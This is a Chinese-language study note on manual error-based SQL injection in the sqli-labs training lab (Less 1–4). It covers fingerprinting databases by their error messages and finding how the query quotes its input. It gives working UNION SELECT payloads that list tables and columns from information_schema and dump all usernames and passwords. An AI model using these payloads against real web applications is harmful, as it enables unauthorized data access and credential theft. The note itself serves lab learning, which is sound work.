# sql手注学习->sqli_labs

## less1 to less4(Error Based Exploitation)

### 1.数据库指纹

我们可以通过分析错误信息找出数据库类型。

1. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”1” LIMIT 0,1′ at line 1`-->MySQL`
2. ORA-00933: SQL command not properly ended`-->Oracle`
3. Microsoft SQL Native Client error ‘80040e14’ Unclosed quotation mark after the character string`-->MSSQL`

### 2.首先传递错误的参数来得到数据库报错信息，并利用错误提示来进行sql注入，这就是`基于错误返回的SQL注入`

1. 加入单引号`'`或者`\`来判断输入数据的封装形式是'data',data,('data'),("data").
2. 在破坏查询找到提示信息后，可以利用注释来修复语法错误，eg.输入1'--+,1'#，修复了语法错误后我们可以利用另外一条select语句来查询获取数据库中的信息。利用union操作符可以使得两日奥select查询同时工作，但是，union语句使用时，两条select语句的列数必须相同。因此可以采用order by 1，2，3....直到提示错误信息。

### 3.用字符型注入进行举例 前后单引号封装

#### 为了让联合注入工作，首先要知道数据库中的表名,键入：

```sql
   id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+
   '使用关键字group_concat一次性查询所有表名'
```

#### 查询已知表中的列名,键入：

```sql
 id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

#### 查看数据库信息,同时查看所有用户名和对应的密码的方法是，键入：

```sql
id=-1' union select 1,group_concat(username),group_concat(password) from users --+
```
